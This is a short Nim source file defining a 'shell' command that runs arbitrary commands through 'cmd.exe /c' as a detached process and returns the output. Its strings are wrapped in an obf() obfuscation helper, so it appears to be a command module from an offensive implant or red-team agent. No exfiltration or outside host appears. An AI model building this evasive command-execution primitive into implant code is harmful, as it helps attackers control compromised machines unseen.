import osproc

# Execute a shell command via 'cmd.exe /c' and return output
proc shell*(args : varargs[string]) : string =
    var commandArgs : seq[string]
    
    if args[0] == "":
        result = obf("Invalid number of arguments received. Usage: 'shell [command]'.")
    else:
        commandArgs.add(obf("/c"))
        commandArgs.add(args)
        result = execProcess(obf("cmd"), args=commandArgs, options={poUsePath, poStdErrToStdOut, poDaemon})